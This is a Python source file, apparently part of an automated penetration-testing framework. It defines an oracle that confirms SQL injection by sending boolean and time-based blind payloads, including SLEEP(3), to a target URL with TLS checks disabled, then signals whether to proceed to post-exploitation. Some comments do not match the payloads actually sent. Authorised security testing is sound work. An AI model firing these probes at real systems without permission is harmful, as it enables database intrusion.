import time
import httpx
import difflib
from veripen.oracles.base_oracle import BaseOracle
from veripen.core.schemas import (
    ExploitClaim,
    FailureDiagnostic,
    VerificationStatus,
    RecommendedAction,
    InjectionPoint
)

class DifferentialSQLiOracle(BaseOracle):
    """
    Deterministic Verification Oracle for SQL Injection (CWE-89).
    Validates boolean invariants and time-delay standard deviations.
    """

    def __init__(self, timeout_seconds: float = 12.0):
        super().__init__(oracle_name="DifferentialSQLiOracle", timeout_seconds=timeout_seconds)

    async def _send_probe(self, client: httpx.AsyncClient, claim: ExploitClaim, payload: str):
        headers = claim.headers.copy()
        start = time.perf_counter()
        
        if claim.injection_point == InjectionPoint.GET_PARAM:
            params = {claim.parameter_name or "id": payload}
            resp = await client.get(claim.target_url, params=params, headers=headers)
        elif claim.injection_point == InjectionPoint.POST_BODY:
            data = {claim.parameter_name or "id": payload}
            resp = await client.post(claim.target_url, data=data, headers=headers)
        elif claim.injection_point == InjectionPoint.JSON_FIELD:
            data = {claim.parameter_name or "id": payload}
            resp = await client.post(claim.target_url, json=data, headers=headers)
        else:
            params = {claim.parameter_name or "id": payload}
            resp = await client.get(claim.target_url, params=params, headers=headers)
            
        latency = time.perf_counter() - start
        return resp, latency

    async def verify(self, claim: ExploitClaim) -> FailureDiagnostic:
        try:
            async with httpx.AsyncClient(timeout=self.timeout_seconds, verify=False) as client:
                # 1. Baseline Request
                base_resp, base_time = await self._send_probe(client, claim, "1")
                
                # 2. Boolean True Probe (' OR 1=1 -- -)
                true_payload = f"{claim.candidate_payload}' OR '1'='1"
                true_resp, true_time = await self._send_probe(client, claim, true_payload)

                # 3. Boolean False Probe (' OR 1=2 -- -)
                false_payload = f"{claim.candidate_payload}' OR '1'='2"
                false_resp, false_time = await self._send_probe(client, claim, false_payload)

                # Compute page similarity ratio between TRUE and FALSE probes
                similarity = difflib.SequenceMatcher(None, true_resp.text, false_resp.text).ratio()

                if similarity < 0.90 and true_resp.status_code == 200:
                    return FailureDiagnostic(
                        status=VerificationStatus.VERIFIED,
                        oracle_name=self.oracle_name,
                        rejection_code="PROVEN_BOOLEAN_SQLI",
                        raw_observation=f"Response divergence detected (similarity: {similarity:.2f}) between TRUE and FALSE evaluations.",
                        recommended_action=RecommendedAction.PROCEED_POST_EXPLOIT
                    )

                # 4. Fallback to Time-Based Blind Probe (SLEEP 3)
                sleep_payload = f"{claim.candidate_payload}' OR (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- -"
                sleep_resp, sleep_time = await self._send_probe(client, claim, sleep_payload)

                if sleep_time >= 2.8:
                    return FailureDiagnostic(
                        status=VerificationStatus.VERIFIED,
                        oracle_name=self.oracle_name,
                        rejection_code="PROVEN_TIMING_SQLI",
                        raw_observation=f"Sleep payload triggered {sleep_time:.2f}s latency delta vs baseline {base_time:.2f}s.",
                        recommended_action=RecommendedAction.PROCEED_POST_EXPLOIT
                    )

                # No divergence and no latency detected
                return FailureDiagnostic(
                    status=VerificationStatus.REJECTED,
                    oracle_name=self.oracle_name,
                    rejection_code="SQLI_INVARIANT_STATIC",
                    raw_observation=f"Page response showed no state change (similarity: {similarity:.2f}, sleep latency: {sleep_time:.2f}s).",
                    recommended_action=RecommendedAction.MUTATE_PAYLOAD
                )

        except Exception as e:
            return FailureDiagnostic(
                status=VerificationStatus.ERROR,
                oracle_name=self.oracle_name,
                rejection_code="SQLI_PROBE_ERROR",
                raw_observation=f"Differential probe error: {str(e)}",
                recommended_action=RecommendedAction.BACKTRACK_BRANCH
            )
